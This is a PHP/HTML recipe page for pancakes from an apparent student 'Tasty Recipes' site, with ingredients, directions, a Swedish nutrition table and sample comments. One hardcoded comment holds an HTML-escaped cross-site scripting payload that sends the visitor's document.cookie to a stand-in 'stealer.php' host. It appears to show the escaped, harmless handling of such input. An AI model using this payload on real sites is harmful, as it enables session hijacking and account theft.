<?php
include_once '../includes/db-connect.php';
include_once '../includes/functions.php';

session_start(); 
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" type="text/css" href="../css/reset.css"> <!-- reset.css -->
        <link rel="stylesheet" type="text/css" href="../css/style.css"> <!-- site theme -->
        <link rel="stylesheet" type="text/css" href="../css/recipe.css"> <!-- recipe.css -->
        <title>Meatballs | Tasty recipes</title>
    </head>
    <body>
        <!-- Header -->
        <header>
            <h1>Tasty Recipes</h1>
            <p>Welcome to the tastiest site you'll ever visit</p>
        </header>

        <!-- Menu -->
        <label for="show-menu" class="show-menu">Show Menu</label>
        <input type="checkbox" id="show-menu" role="button">
        <div id="menu">
            <ul>
                <li><a href="../index.php">Home</a></li>
                <li><a href="../calendar.html">Calendar</a></li>
                <li class="dropdown">
                    <a href="#" class="dropbtn">Recipes</a>
                    <div class="dropdown-content">
                        <a href="meatballs.php">Meatballs</a>
                        <a class="active" href="pancakes.php">Pancakes</a>
                    </div>
                </li>
                <li><a href="login.php">Log in</a></li>
            </ul>
        </div>

        <!-- Middle section -->
        <div class="section group">
            <div class="col span_1_of_2"> <!-- Left div -->
                <!-- Food name -->
                <div id="foodname" class="subdiv">
                    <h1>Pancakes</h1>
                </div>
                <!-- Ingredients -->
                <div id="ingredients" class="subdiv">
                    <h2>Ingredients</h2>
                    <ul>
                        <li>1 cup all-purpose flour</li>
                        <li>1 egg</li>
                        <li>2 tablespoons white sugar</li>
                        <li>1 cup milk</li>
                        <li>2 teaspoons baking powder</li>
                        <li>2 tablespoons vegetable oil</li>
                        <li>1 teaspoon salt</li>
                    </ul>
                </div>
                <!-- Directions -->
                <div id="directions" class="subdiv">
                    <h2>Directions</h2>
                    <ol>
                        <li>In a large bown, mix flour, sugar, baking powder and salt. Make a well in the center, and pour in milk, egg and oil. Mix until smooth.</li>
                        <li>Heat a lightly oiled griddle or frying pan over medium high heat. Pour or scoop the batter onto the griddle, using aproximately 1/4 cup for each pancake. Brown on both sides and serve hot.</li>
                    </ol>
                </div>
                <!-- Comments -->
                <div id="comments" class="subdiv">
                    <h2>Comments</h2>
                    <div class="comment">
                        <h3>James</h3>
                        <p>Pancakes even my dog doesn't like.</p>
                    </div>
                    <div class="comment">
                        <h3>1337Hax0r_BinaryH3x0wnUrMom_KEK</h3>
                        <p>&lt;script&gt;document.location=&quot;http://www.0wn3dddd.com/stealer.php?c=&quot;+document.cookie;&lt;&frasl;script&gt;</p>
                    </div>
                    <div class="comment">
                        <h3>Anonymous</h3>
                        <p>Can I make these without eggs?</p>
                    </div>

                    <div class="commentform">
                        <form id="usrform" action="#">
                            <label for="name">Name:</label>
                            <input type=text id="name"></input><br>
                            <label for="comment">Comment:</label>
                            <textarea name="comment" form="usrform"></textarea><br>
                            <input type=submit value="Post comment"></input>
                        </form>
                    </div>
                </div>
            </div>
            <div class="col span_1_of_2"> <!-- Right div -->
                <!-- Picture -->
                <div id="picture" class="subdiv">
                    <img src="../images/pancakes.png" alt="Pancakes picture">
                </div>
                <!-- Nutritional facts -->
                <div id="nutrifacts" class="subdiv">
                    <h2>Nutritional facts</h2>
                    <table>
                        <tr>
                            <th>Näringsvärde</th>
                            <th>/100g</th>
                        </tr>
                        <tr>
                            <th>Energi</th>
                            <th>1820kJ/512kcal</th>
                        </tr>
                        <tr>
                            <th>Protein</th>
                            <th>3g</th>
                        </tr>
                        <tr>
                            <th>Kolhydrater</th>
                            <th>82g</th>
                        </tr>
                        <tr>
                            <th>Fett</th>
                            <th>15g</th>
                        </tr>
                        <tr>
                            <th>Kostfiber</th>
                            <th>1,2g</th>
                        </tr>
                        <tr>
                            <th>Natrium</th>
                            <th>0,01g</th>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
        <!-- Footer -->
        <footer>
            <p>(R) Tasty recipes</p>
            <p>Contact: admin@tastyrecipes.com</p>
        </footer>

    </body>
</html>
